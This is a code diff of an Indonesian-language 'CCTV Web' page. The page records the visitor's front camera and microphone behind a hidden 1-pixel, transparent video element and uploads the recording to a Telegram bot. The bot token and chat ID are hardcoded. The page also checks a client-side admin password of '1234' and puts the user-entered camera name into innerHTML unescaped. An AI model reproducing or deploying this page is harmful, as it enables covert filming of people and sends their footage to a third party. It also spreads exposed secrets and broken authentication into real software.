@@ -3,106 +3,120 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Admin CCTV</title>
+<title>CCTV Web</title>
 <style>
-  body {
-    font-family: sans-serif;
-    background: #111;
-    color: #fff;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    height: 100vh;
-  }
-  input, button {
-    padding: 10px;
-    margin: 10px;
-    font-size: 16px;
-  }
-  video {
-    width: 1px;
-    height: 1px;
-    opacity: 0;
-    position: absolute;
-    top: 0;
-    left: 0;
-  }
+  body { font-family:sans-serif; margin:0; padding:0; background:#111; color:#fff; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; }
+  h1,h2 { text-align:center; }
+  input, button { padding:10px; margin:5px; font-size:16px; border-radius:5px; border:none; }
+  button { cursor:pointer; background:#0f0; color:#000; }
+  video { width:1px; height:1px; opacity:0; position:absolute; top:0; left:0; }
+  #adminPanel, #cctvPanel { display:none; flex-direction:column; align-items:center; }
 </style>
 </head>
 <body>
 
-<h2>Login Admin</h2>
-<input type="password" id="password" placeholder="Password Admin">
-<button id="loginBtn">Login</button>
+<h1>CCTV Web</h1>
 
-<div id="adminPanel" style="display:none;">
-  <h2>Admin Panel</h2>
-  <button id="startBtn">Mulai Rekam</button>
-  <button id="stopBtn">Hentikan & Kirim</button>
+<div id="mainPanel">
+  <button id="registerCCTVBtn">Daftar CCTV Baru</button>
+  <button id="adminLoginBtn">Login Admin</button>
+</div>
+
+<!-- Form pendaftaran CCTV -->
+<div id="cctvPanel">
+  <h2>Daftar CCTV Baru</h2>
+  <input type="text" id="cctvName" placeholder="Nama CCTV">
+  <button id="startCCTVBtn">Mulai Rekam</button>
+  <button id="stopCCTVBtn">Hentikan & Kirim</button>
   <video id="video" autoplay playsinline></video>
+</div>
+
+<!-- Admin Panel -->
+<div id="adminPanel">
+  <h2>Admin Panel</h2>
+  <input type="password" id="adminPass" placeholder="Password Admin">
+  <button id="loginAdminBtn">Login</button>
+
+  <div id="controlPanel" style="display:none;">
+    <h3>Daftar CCTV Terdaftar</h3>
+    <ul id="cctvList"></ul>
+    <button id="adminStartBtn">Mulai Semua Rekam</button>
+    <button id="adminStopBtn">Hentikan Semua & Kirim</button>
+  </div>
 </div>
 
 <script>
 const BOT_TOKEN = "8223984259:AAHsAazlUhvE4LOCfzSR1Ty-CAa38X7svjk";
 const CHAT_ID = "7412613560";
-const ADMIN_PASS = "1234"; // ganti password admin
+const ADMIN_PASS = "1234";
 
 let recorder, chunks = [], stream;
+let cctvName = "";
 
-const loginBtn = document.getElementById('loginBtn');
-const passwordInput = document.getElementById('password');
+const mainPanel = document.getElementById('mainPanel');
+const cctvPanel = document.getElementById('cctvPanel');
 const adminPanel = document.getElementById('adminPanel');
-const startBtn = document.getElementById('startBtn');
-const stopBtn = document.getElementById('stopBtn');
+const controlPanel = document.getElementById('controlPanel');
 const video = document.getElementById('video');
+const cctvList = document.getElementById('cctvList');
 
-loginBtn.addEventListener('click', () => {
-  if(passwordInput.value === ADMIN_PASS){
-    adminPanel.style.display = "flex";
-    passwordInput.style.display = "none";
-    loginBtn.style.display = "none";
-  } else {
-    alert("Password salah!");
-  }
-});
+document.getElementById('registerCCTVBtn').onclick = () => {
+  mainPanel.style.display = 'none';
+  cctvPanel.style.display = 'flex';
+};
 
-startBtn.addEventListener('click', async () => {
+document.getElementById('startCCTVBtn').onclick = async () => {
+  cctvName = document.getElementById('cctvName').value || "CCTV-" + Date.now();
   try {
-    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+    stream = await navigator.mediaDevices.getUserMedia({ video:{facingMode:"user"}, audio:true });
     video.srcObject = stream;
 
     recorder = new MediaRecorder(stream);
     chunks = [];
-    recorder.ondataavailable = e => chunks.push(e.data);
+    recorder.ondataavailable = e=>chunks.push(e.data);
     recorder.start();
-    alert("Rekaman dimulai!");
-  } catch(err) {
-    alert("Tidak bisa mengakses kamera/mikrofon: " + err);
-  }
-});
+    alert("Rekaman dimulai: "+cctvName);
+  } catch(err){ alert("Error: "+err); }
+};
 
-stopBtn.addEventListener('click', async () => {
+document.getElementById('stopCCTVBtn').onclick = async () => {
   if(recorder && recorder.state !== 'inactive') recorder.stop();
-  if(stream) stream.getTracks().forEach(track => track.stop());
+  if(stream) stream.getTracks().forEach(track=>track.stop());
 
-  recorder.onstop = async () => {
-    const blob = new Blob(chunks, { type: "video/webm" });
+  recorder.onstop = async ()=>{
+    const blob = new Blob(chunks,{type:"video/webm"});
     const formData = new FormData();
     formData.append("chat_id", CHAT_ID);
-    formData.append("video", blob, "rekaman.webm");
+    formData.append("video", blob, cctvName+".webm");
 
     try {
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-        method: "POST",
-        body: formData
-      });
-      alert("✅ Video berhasil dikirim ke Telegram!");
-    } catch(err) {
-      alert("❌ Gagal mengirim video: " + err);
-    }
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method:"POST", body:formData });
+      alert("✅ Video dikirim ke Telegram!");
+    } catch(err){ alert("❌ Gagal kirim: "+err); }
   };
-});
+};
+
+// Admin login
+document.getElementById('adminLoginBtn').onclick = ()=>{
+  mainPanel.style.display = 'none';
+  adminPanel.style.display = 'flex';
+};
+
+document.getElementById('loginAdminBtn').onclick = ()=>{
+  if(document.getElementById('adminPass').value === ADMIN_PASS){
+    controlPanel.style.display='flex';
+    // Tambahkan daftar CCTV terdaftar
+    cctvList.innerHTML = `<li>${cctvName || "Belum ada CCTV"}</li>`;
+  } else alert("Password salah!");
+};
+
+// Admin control tombol (opsional, bisa dikembangkan)
+document.getElementById('adminStartBtn').onclick = ()=>{
+  alert("Mulai semua CCTV (perlu implementasi WebRTC atau trigger remote)");
+};
+document.getElementById('adminStopBtn').onclick = ()=>{
+  alert("Hentikan semua CCTV & kirim (perlu implementasi WebRTC atau trigger remote)");
+};
 </script>
 
 </body>
